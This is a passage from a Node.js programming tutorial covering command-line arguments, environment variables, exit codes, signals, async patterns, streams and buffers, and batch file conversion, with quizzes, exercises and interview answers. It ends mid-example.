// [ "/usr/bin/node", "/home/ali/convert.js", "jobs/deed.docx", "--format", "pdf", "--verbose" ]
const args = process.argv.slice(2);   // drop the node binary and the script path
```

Everything is a string. `"--verbose"` is a flag; `"--format pdf"` is an option with a value; `"jobs/deed.docx"` is a positional argument. Parsing these by hand is tedious, so Node 18.3 added `util.parseArgs`:

```js
import { parseArgs } from "node:util";
const { values, positionals } = parseArgs({
  options: {
    format:  { type: "string", short: "f", default: "pdf" },
    verbose: { type: "boolean", short: "v", default: false },
    out:     { type: "string" },
  },
  allowPositionals: true,
});
console.log(values.format, values.verbose, positionals);   // "pdf" true ["jobs/deed.docx"]
```

Unknown options throw, so typos are caught early. For sub-commands, help text and validation, the CLI chapter introduces `commander`.

### Environment variables

```js
const port = Number(process.env.PORT ?? 3000);
const soffice = process.env.SOFFICE_PATH || "soffice";
if (process.env.NODE_ENV === "production") console.log("prod mode");
```

`process.env` is a plain object of strings, read once at startup. Set variables per run (`PORT=8080 node server.js` on Unix, `set PORT=8080 && node server.js` in cmd, `$env:PORT=8080; node server.js` in PowerShell) or load them from a `.env` file with `node --env-file=.env server.js` (Node 20.6+). The config chapter goes deeper.

### Standard streams

`process.stdout` and `process.stderr` are writable streams; `console.log` writes to stdout and `console.error` to stderr. Keep them separate so `node report.js > report.csv` captures only data while errors still show on screen:

```js
process.stdout.write("file,pages\n");           // no newline added, unlike console.log
console.error("warning: 2 files skipped");      // goes to stderr
```

`process.stdin` lets a script accept piped input (`cat files.txt | node count.js`):

```js
let input = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", chunk => (input += chunk));
process.stdin.on("end", () => console.log(input.split("\n").filter(Boolean).length, "lines"));
```

For interactive prompts use `node:readline/promises`: `const rl = createInterface({ input, output }); const name = await rl.question("Client? ");`.

### Exit codes

A process ends with a number: 0 means success, anything else means failure. Shell scripts, CI pipelines and pm2 read it.

```js
if (!positionals.length) {
  console.error("usage: convert <file> [--format pdf]");
  process.exit(2);                 // conventional: 2 = misuse, 1 = general error
}
process.exitCode = 1;              // preferred: set the code, let pending output flush, exit naturally
```

`process.exit()` kills the process immediately, which can truncate a file still being written to stdout. Prefer `process.exitCode` unless you must stop right now.

### Signals and lifecycle events

```js
process.on("SIGINT", () => { console.log("\nCtrl+C: cleaning up"); process.exit(130); });
process.on("SIGTERM", () => shutdown());          // sent by pm2, Docker, kill
process.on("exit", code => console.log("exiting with", code));   // sync only, no async work here
process.on("uncaughtException", err => { console.error(err); process.exit(1); });
process.on("unhandledRejection", err => { throw err; });
```

`SIGTERM` handling is what makes graceful shutdown possible: stop accepting work, finish the current conversion, then exit.

### Other useful members

| Member | Gives |
|---|---|
| `process.cwd()` | current working directory (where the user ran the command) |
| `process.chdir(dir)` | change it |
| `process.platform`, `process.arch` | `"win32"`, `"linux"`, `"darwin"`; `"x64"`, `"arm64"` |
| `process.pid`, `process.ppid` | process IDs |
| `process.memoryUsage()` | `rss`, `heapUsed` in bytes |
| `process.hrtime.bigint()` | nanosecond timer for benchmarks |
| `process.nextTick(fn)` | run before any other queued work |
| `process.title` | name shown in `ps` / Task Manager |

> **Tip:** `process.cwd()` is where the user typed the command; `__dirname` (or `import.meta.dirname`) is where your script lives. Resolve user-supplied paths against `cwd` and bundled assets (templates, fonts) against the script directory.

### Try It Yourself

```js
// A pure-JS argv parser modelled on util.parseArgs: flags, options with values, short aliases, positionals.
function parseArgs(argv, options) {
  const values = {}, positionals = [];
  for (const [name, o] of Object.entries(options)) if ("default" in o) values[name] = o.default;
  const byShort = Object.fromEntries(Object.entries(options).filter(([, o]) => o.short).map(([n, o]) => [o.short, n]));
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--") { positionals.push(...argv.slice(i + 1)); break; }
    if (!a.startsWith("-")) { positionals.push(a); continue; }
    let [key, inline] = a.replace(/^--?/, "").split("=");
    const name = a.startsWith("--") ? key : byShort[key];
    const opt = options[name];
    if (!opt) throw new Error(`Unknown option '${a}'`);
    if (opt.type === "boolean") values[name] = true;
    else values[name] = inline ?? argv[++i] ?? (() => { throw new Error(`Option '--${name}' requires a value`); })();
  }
  return { values, positionals };
}
const options = { format: { type: "string", short: "f", default: "pdf" }, verbose: { type: "boolean", short: "v", default: false }, out: { type: "string", short: "o" } };
const cases = [
  ["jobs/deed.docx", "--format", "pdf", "--verbose"],
  ["-v", "-o=out/2026", "jobs/a.docx", "jobs/b.docx"],
  ["--", "--not-an-option.docx"],
  ["--fromat", "pdf"],
  ["--out"],
];
for (const argv of cases) {
  try { const r = parseArgs(argv, options); console.log(JSON.stringify(argv).padEnd(52), "->", JSON.stringify(r)); }
  catch (e) { console.log(JSON.stringify(argv).padEnd(52), "-> error:", e.message, "(exit code 2)"); }
}
```

### Quiz

1. What are the first two elements of `process.argv`?
- [x] The Node executable path and the script path
- [ ] The script name and the first argument
- [ ] The current directory and the user name
> Real arguments start at index 2, hence `process.argv.slice(2)`.

2. What type are values in `process.env`?
- [ ] Whatever type was set
- [x] Always strings (or undefined)
- [ ] Numbers for numeric values
> Environment variables are text; convert with `Number()` or compare to `"true"`.

3. Which exit code signals success?
- [x] 0
- [ ] 1
- [ ] -1
> Zero means success; non-zero codes are read as failure by shells and CI.

4. Why prefer `process.exitCode = 1` over `process.exit(1)`?
- [ ] It is faster
- [x] It lets pending output and async work finish before exiting
- [ ] It works in browsers
> `process.exit` terminates immediately and can cut off buffered stdout writes.

### Exercises

1. **Usage message** — Print a usage line to stderr and exit with code 2 when no positional argument is given.
<details><summary>Solution</summary>

```js
const files = process.argv.slice(2).filter(a => !a.startsWith("-"));
if (files.length === 0) { console.error("usage: node convert.js <file...> [--format pdf]"); process.exitCode = 2; }
```

</details>

2. **Line counter** — Write a script that counts non-empty lines from stdin so that `type list.txt | node count.js` works on Windows.
<details><summary>Solution</summary>

```js
let buf = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", c => (buf += c));
process.stdin.on("end", () => console.log(buf.split(/\r?\n/).filter(l => l.trim()).length));
```

</details>

3. **Graceful Ctrl+C** — Handle SIGINT so a running batch prints "stopping after current file" and exits with 130 once a flag is set.
<details><summary>Solution</summary>

```js
let stopping = false;
process.on("SIGINT", () => { stopping = true; console.error("stopping after current file"); });
async function run(files) {
  for (const f of files) { if (stopping) { process.exitCode = 130; return; } await convert(f); }
}
```

</details>

### Interview Questions

**Q: How do you write a Node script that behaves well inside shell pipelines?**
Read input from `process.stdin` when no file argument is given, write data to stdout and diagnostics to stderr so redirection captures only data, and set a non-zero `process.exitCode` on failure so `&&` chains and CI stop. Avoid `process.exit()` right after writing large output because stdout to a pipe is asynchronous and can be truncated. Handle `SIGPIPE`/`EPIPE` gracefully when the consumer closes early (`node report.js | head`), and respect `NO_COLOR` or detect `process.stdout.isTTY` before printing colours or progress bars.

**Q: What is the difference between process.nextTick and setImmediate?**
`process.nextTick` callbacks run right after the current operation completes, before the event loop continues and before promise microtasks, which makes them the highest-priority deferral and a way to starve the loop if abused. `setImmediate` runs in the check phase of the next loop iteration, after I/O callbacks, and is the correct way to yield "after I/O". A common interview twist is that `setTimeout(fn, 0)` versus `setImmediate(fn)` order is non-deterministic from the main module but always timeout-first-then-immediate... actually `setImmediate` always runs first when both are scheduled inside an I/O callback, because the check phase follows the poll phase directly.

**Q: How should a long-running Node process handle SIGTERM?**
Register a `SIGTERM` handler that flips a shutting-down flag, stops accepting new work (call `server.close()` or stop pulling from the queue), waits for in-flight operations to finish with a timeout, closes database and file handles, and then exits with 0. Without a handler Node exits immediately on SIGTERM, which is what pm2, Docker and Kubernetes send before killing the process, so half-written PDFs and dropped requests are the symptom. I also log the shutdown steps, because "why did the container restart" is usually answered by those logs.

# LEVEL: Intermediate

## Async patterns in Node

Node's entire design rests on non-blocking I/O: start an operation, do other work, handle the result when it arrives. Over the years the way that "later" is expressed has evolved through three styles, all of which you will meet in real code and documentation.

### Style 1: error-first callbacks

The original Node convention: the last argument is a function whose first parameter is an error (or `null`), followed by the result.

```js
const fs = require("node:fs");
fs.readFile("manifest.json", "utf8", (err, text) => {
  if (err) return console.error("read failed:", err.code);
  fs.writeFile("copy.json", text, err => {
    if (err) return console.error("write failed:", err.code);
    console.log("done");
  });
});
```

Every step nests one level deeper and every step repeats the error check. Forgetting `return` after handling an error is a classic bug: execution continues with `text` undefined.

### Style 2: promises and util.promisify

`util.promisify` converts any error-first-callback function into one that returns a promise, and most core modules already ship promise versions (`fs/promises`, `stream/promises`, `timers/promises`, `dns/promises`, `readline/promises`).

```js
const { promisify } = require("node:util");
const { exec } = require("node:child_process");
const execAsync = promisify(exec);
const { stdout } = await execAsync("soffice --version");

const { setTimeout: sleep } = require("node:timers/promises");
await sleep(500);                      // promise-based delay, no callback
```

`promisify` follows the error-first convention exactly; functions with different signatures (like `fs.exists`, which has no error argument) need a custom wrapper or a `util.promisify.custom` symbol. `util.callbackify` goes the other direction for legacy APIs that demand a callback.

### Style 3: async/await

```js
import { readFile, writeFile } from "node:fs/promises";
async function copyManifest() {
  try {
    const text = await readFile("manifest.json", "utf8");
    await writeFile("copy.json", text);
    console.log("done");
  } catch (err) {
    console.error("copy failed:", err.code ?? err.message);
    throw err;                          // let the caller decide
  }
}
```

This is the style to write today. ESM files support top-level `await`, so scripts no longer need a `main().catch(...)` wrapper, though it remains the pattern in CommonJS.

### Sequential versus parallel

```js
// Sequential: one file at a time (safe for a single LibreOffice instance)
for (const f of files) await convert(f);

// Parallel: all at once (fine for small I/O, dangerous for 500 conversions)
await Promise.all(files.map(convert));

// Bounded concurrency: at most N at a time
async function mapLimit(items, limit, fn) {
  const results = new Array(items.length);
  let next = 0;
  async function worker() {
    while (next < items.length) { const i = next++; results[i] = await fn(items[i], i); }
  }
  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, worker));
  return results;
}
await mapLimit(files, 4, convert);
```

Bounded concurrency is the pattern for batch document work: enough parallelism to use the CPU, not so much that you exhaust file descriptors or memory. The `p-limit` and `p-map` packages implement it with more features.

### The Node event loop phases

Node's loop (from libuv) runs phases in order: **timers** (`setTimeout`, `setInterval`), **pending callbacks**, **poll** (I/O callbacks, waits here when idle), **check** (`setImmediate`), **close callbacks**. Between every phase, and after every callback, Node drains `process.nextTick` callbacks and then promise microtasks.

```js
setTimeout(() => console.log("timeout"), 0);
setImmediate(() => console.log("immediate"));
process.nextTick(() => console.log("nextTick"));
Promise.resolve().then(() => console.log("promise"));
console.log("sync");
// sync, nextTick, promise, then timeout/immediate (order of these two varies from the main module)
```

Inside an I/O callback, `setImmediate` always fires before a `setTimeout(0)` because the check phase follows poll directly.

### Errors in async code

- Callback style: check `err` in every callback; errors thrown inside a callback cannot be caught by the caller's `try`.
- Promises: attach `.catch` or `await` inside `try`; an unhandled rejection crashes Node 15+ by default (`--unhandled-rejections=strict` is now the default behaviour).
- Async iteration over streams and `events.once` bring event-based APIs into `await` land: `for await (const line of rl)`.

### AbortController for cancellation

```js
const ac = new AbortController();
setTimeout(() => ac.abort(), 5000);
try {
  const text = await readFile("huge.csv", { encoding: "utf8", signal: ac.signal });
} catch (e) {
  if (e.name === "AbortError") console.log("cancelled");
}
```

Most core async APIs accept `signal`, including `fetch`, `fs/promises`, `timers/promises` and `child_process`.

> **Interview note:** Be able to write `mapLimit` (or `promisePool`) from memory on a whiteboard. It combines closures, `Promise.all`, a shared index and `async` workers, and it is the single most common Node coding exercise.

### Try It Yourself

```js
// promisify and a bounded-concurrency mapper, both in pure JavaScript.
function promisify(fn) {
  return (...args) => new Promise((resolve, reject) => fn(...args, (err, result) => (err ? reject(err) : resolve(result))));
}
function legacyConvert(file, cb) {            // error-first callback API, like old fs functions
  setTimeout(() => (file.endsWith(".corrupt") ? cb(new Error(`cannot open ${file}`)) : cb(null, file.replace(/\.docx$/, ".pdf"))), 40 + Math.random() * 80);
}
const convert = promisify(legacyConvert);

async function mapLimit(items, limit, fn) {
  const results = new Array(items.length); let next = 0, active = 0, peak = 0;
  async function worker() {
    while (next < items.length) {
      const i = next++; active++; peak = Math.max(peak, active);
      try { results[i] = { ok: true, value: await fn(items[i]) }; } catch (e) { results[i] = { ok: false, error: e.message }; }
      active--;
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, worker));
  return { results, peak };
}
(async () => {
  const files = Array.from({ length: 9 }, (_, i) => `jobs/file-${i + 1}${i === 4 ? ".corrupt" : ".docx"}`);
  const t0 = Date.now();
  const { results, peak } = await mapLimit(files, 3, convert);
  results.forEach((r, i) => console.log(files[i].padEnd(22), r.ok ? "-> " + r.value : "FAILED: " + r.error));
  console.log(`9 files, limit 3, peak concurrency ${peak}, ${Date.now() - t0} ms (sequential would be ~700 ms)`);
  setTimeout(() => console.log("timeout")); Promise.resolve().then(() => console.log("promise microtask")); console.log("sync");
})();
```

### Quiz

1. In the error-first callback convention, what is the first argument?
- [x] The error, or null when there was none
- [ ] The result
- [ ] The file name
> Every callback checks `err` first; the result follows.

2. What does `util.promisify(fs.readFile)` return?
- [ ] The file contents
- [x] A function that returns a promise
- [ ] A stream
> `promisify` wraps a callback-style function so it can be awaited.

3. Which runs first: `process.nextTick` or a resolved promise's `then`?
- [x] process.nextTick
- [ ] The promise callback
- [ ] They alternate
> Node drains the nextTick queue before the promise microtask queue.

4. Why use bounded concurrency instead of `Promise.all` on 500 conversions?
- [ ] Promise.all cannot handle more than 100 promises
- [x] To avoid exhausting memory, file descriptors or the external tool
- [ ] Bounded concurrency is always faster
> Unlimited parallelism can overwhelm the system; a pool keeps N tasks in flight.

### Exercises

1. **Promisify by hand** — Without `util`, write `promisify(fn)` and use it on a fake `(x, cb)` function that calls back with `x * 2`.
<details><summary>Solution</summary>

```js
const promisify = fn => (...a) => new Promise((res, rej) => fn(...a, (e, r) => (e ? rej(e) : res(r))));
const doubleCb = (x, cb) => setTimeout(() => cb(null, x * 2), 10);
promisify(doubleCb)(21).then(console.log); // 42
```

</details>

2. **Sequential with results** — Write `series(tasks)` that runs an array of async functions one after another and returns their results in order.
<details><summary>Solution</summary>

```js
async function series(tasks) {
  const out = [];
  for (const t of tasks) out.push(await t());
  return out;
}
series([() => Promise.resolve(1), async () => 2]).then(console.log); // [1, 2]
```

</details>

3. **Timeout with AbortSignal** — Use `AbortSignal.timeout(100)` to cancel a 500 ms sleep from `timers/promises` and report the error name.
<details><summary>Solution</summary>

```js
// Node-only: run locally
const { setTimeout: sleep } = require("node:timers/promises");
sleep(500, null, { signal: AbortSignal.timeout(100) }).catch(e => console.log(e.name)); // AbortError
```

</details>

### Interview Questions

**Q: What is callback hell and how did Node move past it?**
Callback hell is deeply nested error-first callbacks where each async step lives inside the previous one, producing a rightward drift, repeated error checks and no way to compose or reuse steps. Promises flattened chains and centralized error handling with `catch`; `util.promisify` and the `fs/promises` family made the core API promise-based; `async/await` in Node 8 gave synchronous-looking control flow with ordinary `try/catch` and loops. The remaining discipline is choosing between sequential `await`, `Promise.all` and bounded concurrency, and never mixing callbacks with promises in the same function.

**Q: Describe the phases of the Node event loop.**
Each iteration runs timers (expired `setTimeout`/`setInterval` callbacks), pending callbacks (deferred system errors), poll (retrieve new I/O events and run their callbacks, blocking here when nothing else is due), check (`setImmediate` callbacks), and close callbacks (`socket.on("close")`). After every callback Node drains the `process.nextTick` queue and then the promise microtask queue before moving on. The practical consequences: `nextTick` beats promises, `setImmediate` beats `setTimeout(0)` inside I/O callbacks, and a long synchronous callback in any phase delays everything else.

**Q: How would you process 10,000 files without running out of resources?**
Never `Promise.all` over all of them; use a bounded pool such as `mapLimit` or `p-limit` with a concurrency chosen by measuring (typically 4 to 16 for disk I/O, 1 to 2 per CPU for LibreOffice conversions). Stream file contents instead of loading them fully, collect results as `{ ok, value }` or `{ ok, error }` so one failure does not abort the batch, and write a manifest of completed items so the job can resume. I also watch `EMFILE` errors as the signal that the concurrency is too high for the OS file-descriptor limit.

## Streams & buffers

A **Buffer** is Node's fixed-size chunk of raw bytes; a **stream** is a sequence of those chunks delivered over time. Together they let a script copy a 2 GB PDF using 64 KB of memory, pipe LibreOffice's output straight into a zip file, or hash a file while it is still downloading. If `fs.readFile` is "load the whole thing", streams are "handle it as it arrives".

### Buffers: bytes, not strings

```js
const buf = Buffer.from("Policy Manual", "utf8");
console.log(buf.length);              // 13 bytes
console.log(buf.toString("hex"));     // 506f6c696379204d616e75616c
console.log(buf.subarray(0, 6).toString()); // Policy
const pdfHeader = Buffer.from([0x25, 0x50, 0x44, 0x46]); // %PDF
console.log(pdfHeader.toString("latin1"));  // %PDF
```

`Buffer` is a subclass of `Uint8Array`, so everything you know about typed arrays applies. Encodings that matter for document work: `utf8` (default), `utf16le` (what Windows Notepad calls "Unicode"), `latin1`, `base64` and `hex`. A `.docx` file is a zip, so its first two bytes are always `PK` (0x50 0x4B); checking those bytes is a more reliable file-type test than trusting the extension.

```js
const fh = await fs.promises.open("contract.docx");
const { buffer } = await fh.read(Buffer.alloc(4), 0, 4, 0);
await fh.close();
console.log(buffer.toString("latin1").startsWith("PK") ? "zip container" : "not a docx");
```

### The four stream types

| Type | Direction | Core examples |
|---|---|---|
| `Readable` | data comes out | `fs.createReadStream`, `process.stdin`, HTTP request body |
| `Writable` | data goes in | `fs.createWriteStream`, `process.stdout`, HTTP response |
| `Duplex` | both, independently | TCP sockets |
| `Transform` | both, output derived from input | `zlib.createGzip()`, `crypto.createHash()` is similar |

### Reading a large file

```js
import { createReadStream } from "node:fs";
const rs = createReadStream("production-report.csv", { encoding: "utf8", highWaterMark: 64 * 1024 });
let lines = 0;
for await (const chunk of rs) lines += chunk.split("\n").length - 1;
console.log("rows:", lines);
```

`highWaterMark` is the chunk size (64 KiB default for files, 16 KiB for other streams). Note the subtle bug: a line can be split across two chunks. Counting `\n` is fine, but parsing CSV requires carrying the partial last line into the next chunk, which is exactly what `node:readline` does for you:

```js
import { createInterface } from "node:readline";
const rl = createInterface({ input: createReadStream("report.csv") });
for await (const line of rl) { /* one complete line at a time */ }
```

### pipeline, not pipe

`readable.pipe(writable)` is the classic API, but it does not forward errors, so a failing destination leaves the source open. Use `stream.pipeline` (or `stream/promises`):

```js
import { pipeline } from "node:stream/promises";
import { createGzip } from "node:zlib";
await pipeline(
  createReadStream("handbook-767p.pdf"),
  createGzip(),
  createWriteStream("handbook-767p.pdf.gz")
);
```

`pipeline` destroys every stream on error and resolves when the last one finishes. It accepts async generators too, which is the easiest way to write a custom transform.

### Writing a Transform

```js
import { Transform } from "node:stream";
const upperHeaders = new Transform({
  transform(chunk, encoding, callback) {
    callback(null, chunk.toString().replace(/^([^,\n]+)/m, m => m.toUpperCase()));
  }
});
```

Or as an async generator inside `pipeline`:

```js
await pipeline(createReadStream("in.csv"), async function* (source) {
  for await (const chunk of source) yield chunk.toString().replaceAll("\r\n", "\n");
}, createWriteStream("out.csv"));
```

### Backpressure

When a writable is slower than its readable (disk versus network, or LibreOffice versus a fast SSD), `write()` returns `false` once its internal buffer passes `highWaterMark`. A well-behaved producer then pauses until the `drain` event. `pipe` and `pipeline` handle this automatically; hand-written loops must:

```js
async function writeMany(ws, rows) {
  for (const row of rows) {
    if (!ws.write(row + "\n")) await once(ws, "drain");
  }
  ws.end();
}
```

Ignoring backpressure does not crash immediately; it silently grows memory until the process dies on the 300th file of a batch, which is why it shows up in interviews.

> **Tip:** Web Streams (`ReadableStream`, `TransformStream`) are also available in Node 18+ and are what `fetch` returns. `stream.Readable.fromWeb()` and `.toWeb()` convert between the two worlds.

### Try It Yourself

```js
// Streams in pure JS: a tiny Readable/Transform/Writable model with backpressure,
// using the same vocabulary as node:stream. Runs in any browser.
const enc = new TextEncoder(), dec = new TextDecoder();
const source = new ReadableStream({           // Web Streams API, also available in Node 18+
  start(controller) {
    const rows = ["file_no,state,status", "TX-1001,TX,Open", "WY-2002,WY,Closed", "FL-3003,FL,Open"];
    rows.forEach(r => controller.enqueue(enc.encode(r + "\n")));
    controller.close();
  }
});
const upperState = new TransformStream({
  transform(chunk, controller) {
    const text = dec.decode(chunk);
    controller.enqueue(enc.encode(text.replace(/^([^,]+),([a-z]{2}),/i, (m, a, b) => `${a},${b.toUpperCase()},`)));
  }
});
let bytes = 0, out = [];
const sink = new WritableStream({
  write(chunk) { bytes += chunk.byteLength; out.push(dec.decode(chunk).trim()); }
}, new CountQueuingStrategy({ highWaterMark: 2 }));   // small buffer to demonstrate backpressure

source.pipeThrough(upperState).pipeTo(sink).then(() => {
  console.log(out.join("\n"));
  console.log(`bytes written: ${bytes}`);
  const b = new Uint8Array([0x50, 0x4b, 0x03, 0x04]);          // what Buffer.from([0x50,0x4b,...]) holds
  console.log("looks like a zip/docx:", String.fromCharCode(b[0], b[1]) === "PK");
  console.log("hex:", Array.from(b, x => x.toString(16).padStart(2, "0")).join(""));
});
```

### Quiz

1. What does `Buffer.from("Ali", "utf8").length` return?
- [ ] 1
- [x] 3
- [ ] 6
> Each ASCII character is one byte; `length` counts bytes, not characters.

2. Why prefer `stream.pipeline` over `.pipe()`?
- [x] It propagates errors and destroys all streams on failure
- [ ] It is faster
- [ ] `.pipe()` was removed in Node 20
> `.pipe()` still exists but does not clean up when a later stream errors.

3. What does `writable.write()` returning `false` mean?
- [ ] The write failed
- [x] The internal buffer is full; wait for `drain`
- [ ] The stream is closed
> The data is still queued; `false` is the backpressure signal.

4. Which stream type is `zlib.createGzip()`?
- [ ] Readable
- [ ] Writable
- [x] Transform
> It consumes uncompressed bytes and emits compressed bytes.

### Exercises

1. **Magic bytes** — Write a function that returns `"pdf"`, `"zip"` or `"unknown"` from the first four bytes of a `Uint8Array` (`%PDF` and `PK\x03\x04`).
<details><summary>Solution</summary>

```js
function kind(bytes) {
  const s = String.fromCharCode(...bytes.subarray(0, 4));
  if (s === "%PDF") return "pdf";
  if (s.startsWith("PK\x03\x04")) return "zip";
  return "unknown";
}
console.log(kind(new Uint8Array([0x25, 0x50, 0x44, 0x46]))); // pdf
```

</details>

2. **Line counter with streams** — Using `readline` over `createReadStream`, count non-empty lines in a file without loading it fully.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { createReadStream } from "node:fs";
import { createInterface } from "node:readline";
let n = 0;
for await (const line of createInterface({ input: createReadStream(process.argv[2]) })) if (line.trim()) n++;
console.log(n);
```

</details>

3. **Gzip a folder of PDFs** — Use `pipeline` to compress every `.pdf` in a directory to `.pdf.gz`.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { readdir } from "node:fs/promises";
import { createReadStream, createWriteStream } from "node:fs";
import { createGzip } from "node:zlib";
import { pipeline } from "node:stream/promises";
for (const f of (await readdir(".")).filter(f => f.endsWith(".pdf")))
  await pipeline(createReadStream(f), createGzip(), createWriteStream(f + ".gz"));
```

</details>

### Interview Questions

**Q: When would you use streams instead of `readFile`?**
Whenever the data is larger than I want in memory at once, arrives over time, or should start being processed before it has fully arrived. Reading a 767-page PDF to hash it is a stream job: `createReadStream` piped into `crypto.createHash("sha256")` uses a few hundred kilobytes regardless of file size, whereas `readFile` allocates the whole file. HTTP uploads, log processing, CSV exports of a production table and gzip compression are all naturally streaming. For a 20 KB JSON config, `readFile` is simpler and just as fast; streams have setup cost and more failure modes, so I do not use them by reflex.

**Q: Explain backpressure and what happens if you ignore it.**
Backpressure is the mechanism by which a slow consumer tells a fast producer to pause. `write()` returns `false` when the writable's buffer exceeds `highWaterMark`; the producer should stop and resume on `drain`. `pipe` and `pipeline` implement this by pausing the readable. If you ignore it, every chunk is still accepted and queued in memory, so nothing breaks in a test with a small file but a batch job over large files grows without bound until the process is killed for out-of-memory. I have seen this exactly when writing thousands of rows to a network share with a hand-rolled loop.

**Q: What is the difference between `Buffer` and a string, and why does it matter for documents?**
A string is a sequence of UTF-16 code units with no fixed byte representation; a `Buffer` is actual bytes. Converting between them requires an encoding, and choosing the wrong one corrupts text: a CSV exported by Excel as UTF-16LE read with `utf8` shows null bytes between letters, and a Latin-1 file read as UTF-8 turns "é" into replacement characters. Binary formats such as PDF and DOCX must never pass through a string conversion at all, since bytes above 0x7F would be reinterpreted. In practice I keep binary data as `Buffer` end to end and decode only real text, specifying the encoding explicitly.

## Working with files at scale

A Fiverr order rarely arrives as one file. It is a folder: 40 chapter `.docx` files, a `covers/` subfolder, a stray `~$chapter3.docx` lock file and a `Thumbs.db`. Batch work means finding the right files, transforming each one safely, and producing a report of what happened. This chapter builds that skeleton with core modules only.

### Finding files: fs.glob and fast-glob

Node 22 added `fs.glob` (promise form in `fs/promises`); for older versions `fast-glob` or `globby` from npm do the same job.

```js
import { glob } from "node:fs/promises";          // Node 22+
for await (const file of glob("**/*.docx", { cwd: "orders/1042", exclude: f => f.startsWith("~$") }))
  console.log(file);
```

```js
import fg from "fast-glob";                       // any Node version
const files = await fg(["**/*.docx", "!**/~$*", "!**/node_modules/**"], { cwd: "orders/1042", absolute: true });
```

Glob syntax: `*` matches within one path segment, `**` crosses directories, `{docx,doc,rtf}` is alternation, `!` (fast-glob) or `exclude` (core) negates. Always exclude Office lock files (`~$name.docx`), which exist while a file is open in Word and are not real documents.

### Walking without glob

`readdir` with `recursive: true` (Node 20+) returns every path under a directory; with `withFileTypes` it returns `Dirent` objects so you can skip a `stat` call per entry.

```js
import { readdir } from "node:fs/promises";
import path from "node:path";
const entries = await readdir("orders/1042", { recursive: true, withFileTypes: true });
const docs = entries.filter(e => e.isFile() && path.extname(e.name).toLowerCase() === ".docx")
                    .map(e => path.join(e.parentPath, e.name));   // e.path before Node 21
```

### A batch skeleton

```js
import { mkdir, stat, writeFile } from "node:fs/promises";
import path from "node:path";

async function batch(inputs, outDir, convert, { concurrency = 4 } = {}) {
  await mkdir(outDir, { recursive: true });
  const report = [];
  let next = 0;
  async function worker() {
    while (next < inputs.length) {
      const src = inputs[next++];
      const dest = path.join(outDir, path.basename(src, path.extname(src)) + ".pdf");
      const t0 = performance.now();
      try {
        await convert(src, dest);
        const { size } = await stat(dest);
        report.push({ src, dest, ok: true, bytes: size, ms: Math.round(performance.now() - t0) });
      } catch (err) {
        report.push({ src, dest, ok: false, error: err.message, ms: Math.round(performance.now() - t0) });
      }
    }
  }
  await Promise.all(Array.from({ length: concurrency }, worker));
  await writeFile(path.join(outDir, "_report.json"), JSON.stringify(report, null, 2));
  return report;
}
```

Three habits are baked in: create the output folder up front, never let one failure stop the batch, and write a machine-readable report next to the outputs. The report is what you attach to the client message ("38 of 40 converted; two files were password protected").

### Idempotent runs: skip what is done

Re-running a 500-file batch after fixing two broken inputs should not redo the 498 good ones. Compare modification times:

```js
async function isUpToDate(src, dest) {
  try {
    const [s, d] = await Promise.all([stat(src), stat(dest)]);
    return d.mtimeMs >= s.mtimeMs;
  } catch { return false; }             // dest missing -> not up to date
}
```

Make's rule, in five lines. For stronger guarantees hash the input (`crypto.createHash("sha256")` over a stream) and store the hash in the report.

### Atomic writes

If the process dies half-way through `writeFile`, the destination is a truncated, corrupt file that `isUpToDate` will happily consider finished. Write to a temp name and rename, because `rename` on the same filesystem is atomic:

```js
import { rename } from "node:fs/promises";
async function writeAtomic(dest, data) {
  const tmp = `${dest}.${process.pid}.tmp`;
  await writeFile(tmp, data);
  await rename(tmp, dest);
}
```

### Naming and ordering

Clients send `Chapter 1.docx`, `Chapter 10.docx`, `Chapter 2.docx`. Lexicographic sort puts 10 before 2. Use a numeric-aware collator:

```js
const natural = new Intl.Collator(undefined, { numeric: true, sensitivity: "base" });
files.sort((a, b) => natural.compare(a, b));      // Chapter 1, Chapter 2, ..., Chapter 10
```

`path.parse` gives `{ root, dir, base, ext, name }`, and `String.prototype.normalize("NFC")` fixes file names that macOS stores in decomposed Unicode (NFD), which otherwise makes `Résumé.docx` not equal to `Résumé.docx` typed on Windows.

### Watching a folder

`fs.watch` fires on changes but is inconsistent across operating systems (duplicate events, no recursive mode on Linux before Node 20). For "drop a file in `inbox/` and it gets converted" workflows the `chokidar` package is the standard choice, with `awaitWriteFinish` to avoid reacting to a half-copied file.

> **Warning:** Windows paths have a 260-character limit (`MAX_PATH`) unless long paths are enabled. Deeply nested client folders plus long chapter names hit it; the error is `ENAMETOOLONG` or a puzzling `ENOENT`. Shorten the working directory or prefix with `\\?\`.

### Try It Yourself

```js
// A batch runner with per-file results, natural sort and skip-if-up-to-date, modelled in memory.
const natural = new Intl.Collator(undefined, { numeric: true, sensitivity: "base" });
const inbox = ["Chapter 10.docx", "Chapter 2.docx", "~$Chapter 2.docx", "Chapter 1.docx", "Thumbs.db", "covers/front.docx", "Appendix.DOCX"];
const wanted = inbox
  .filter(f => /\.docx$/i.test(f) && !f.split("/").pop().startsWith("~$"))
  .sort(natural.compare);
console.log("selected:", wanted);

const outputs = new Map([["Chapter 1.pdf", { mtime: 200 }]]);   // pretend one output already exists
const inputMtime = f => (f === "Chapter 1.docx" ? 100 : 300);     // Chapter 1 is older than its PDF
const upToDate = (src, dest) => outputs.has(dest) && outputs.get(dest).mtime >= inputMtime(src);

async function convert(src) {                                    // fake converter: fails on covers
  await new Promise(r => setTimeout(r, 30));
  if (src.startsWith("covers/")) throw new Error("password protected");
  return src.replace(/\.docx$/i, ".pdf").split("/").pop();
}
async function batch(files, concurrency) {
  const report = []; let next = 0;
  async function worker() {
    while (next < files.length) {
      const src = files[next++], dest = src.replace(/\.docx$/i, ".pdf").split("/").pop(), t0 = performance.now();
      if (upToDate(src, dest)) { report.push({ src, status: "skipped" }); continue; }
      try { const out = await convert(src); outputs.set(out, { mtime: Date.now() }); report.push({ src, status: "ok", dest: out, ms: Math.round(performance.now() - t0) }); }
      catch (e) { report.push({ src, status: "failed", error: e.message }); }
    }
  }
  await Promise.all(Array.from({ length: concurrency }, worker));
  return report;
}
batch(wanted, 2).then(report => {
  console.table(report);
  const c = report.reduce((a, r) => ((a[r.status] = (a[r.status] || 0) + 1), a), {});
